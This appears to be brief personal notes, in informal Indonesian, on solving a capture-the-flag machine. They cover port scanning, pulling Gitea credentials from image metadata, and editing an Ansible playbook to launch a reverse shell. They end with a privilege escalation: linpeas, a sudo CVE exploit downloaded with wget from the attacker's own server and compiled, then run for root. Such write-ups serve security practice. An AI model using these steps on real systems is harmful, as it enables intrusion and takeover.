# boot:
1. scan nmap 22 80 8080 kebuka
2. coba donglot image yg thumb aja dah -> exiftool ke fotonya
3. ada tuh txt disitu kunjungi aja -> ternyata creds gitea jir -> cek di nmap ada port banyak 
4. cek repo nya ada flag -> di yaml config buat web di port lain
5. ubah aja di test -> hosts: all, remote_user: bismuth, tasks: -name: sebus, shell: bash -c 'revshell'
6. coba2 aja dah -> klaim flag ke 2

# pe: 
1. nyalain linpeas -> ada cve baron coba cari exploit nya di github
2. wget dari python servermu -> wget ip:port/folder --no-parent --recursive -> dah cd make aja
3. ./sandwich 0 -> klaim root

